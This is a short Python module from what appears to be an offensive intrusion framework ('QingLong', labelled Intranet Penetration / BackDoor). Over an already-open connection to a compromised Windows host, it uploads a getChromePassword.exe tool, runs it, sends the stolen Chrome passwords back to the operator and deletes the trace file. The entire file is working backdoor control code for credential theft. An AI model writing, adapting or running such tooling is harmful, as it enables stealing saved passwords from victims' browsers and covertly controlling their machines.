import struct
from AuxiliaryFunctions import uploadCVE
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI


def getChromePassword(conn):
    commands = ["back", "upload getChromePassword.exe", "run"]
    completer = WordCompleter(commands)
    formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Intranet Penetration)-\033[0m\033[1;31;31m[BackDoor/Small Tools ~ getChromePasswords] \033[0m')
    while True:
        try:
            choice = prompt(formatted_text1, completer=completer)
            if choice == "":
                continue
            elif choice == "back":
                break
            elif choice.split()[0] == 'upload':
                uploadCVE.uploadCVE(conn, choice)
                continue
            elif choice == "run":
                command = "getChromePassword.exe > getChromePassword.txt && type getChromePassword.txt && DEL getChromePassword.txt && exit"
                receive(conn, command)
                break
        except:
            print('\033[1;31;31m' + "[-] Failed to get Chrome's passwords." + '\033[0m')
            break


def receive(conn, command):
    conn.sendall(command.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break
